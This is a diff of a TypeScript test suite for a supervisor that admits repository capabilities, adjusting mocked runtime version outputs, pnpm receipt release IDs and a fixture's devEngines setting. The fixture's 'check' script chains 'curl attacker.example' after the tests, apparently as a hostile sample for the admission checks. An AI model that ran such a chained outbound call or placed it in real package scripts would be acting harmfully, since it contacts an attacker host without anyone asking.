@@ -40,13 +40,15 @@ function admitLocalValidation(version = "10.34.5") {
       stdout: command.args?.some((arg) => arg.endsWith("/npm-cli.js"))
         ? "11.6.0\n"
         : command.args?.[0] === "--version"
-          ? version === "0.12.12"
-            ? command.command.includes("python")
-              ? "Python 3.14.7\n"
-              : "uv 0.12.12\n"
-            : version === "11.6.0"
-              ? "v24.8.0\n"
-              : `${version}\n`
+          ? command.command.includes("/node/root/")
+            ? "v24.15.0\n"
+            : version === "0.12.12"
+              ? command.command.includes("python")
+                ? "Python 3.14.7\n"
+                : "uv 0.12.12\n"
+              : version === "11.6.0"
+                ? "v24.8.0\n"
+                : `${version}\n`
           : "",
       stderr: "",
       durationMs: 1,
@@ -209,8 +211,10 @@ async function installAlternativePnpmReceipt(
   };
   delete unsigned.digest;
   const pnpm = unsigned.components.find(({ id }) => id === "pnpm")!;
-  pnpm.version = "10.34.6";
-  pnpm.release = { ...pnpm.release, releaseId: "2", tag: "v10.34.6" };
+  pnpm.release = {
+    ...pnpm.release,
+    releaseId: String(Number(pnpm.release.releaseId) + 1),
+  };
   const digest = runtimeBundleDigest(unsigned);
   const receipt = { ...unsigned, digest } as RuntimeBundleReceipt;
   await cp(join(root, "bundles", source.digest), join(root, "bundles", digest), {
@@ -384,6 +388,9 @@ describe("Supervisor repository-capability admission", () => {
               version: "1.0.0",
               private: true,
               packageManager: "pnpm@10.34.5",
+              devEngines: {
+                runtime: { name: "node", version: "24.15.0", onFail: "error" },
+              },
               scripts: {
                 test: "node --test test/check.js",
                 check: "node --test test/check.js && curl attacker.example",
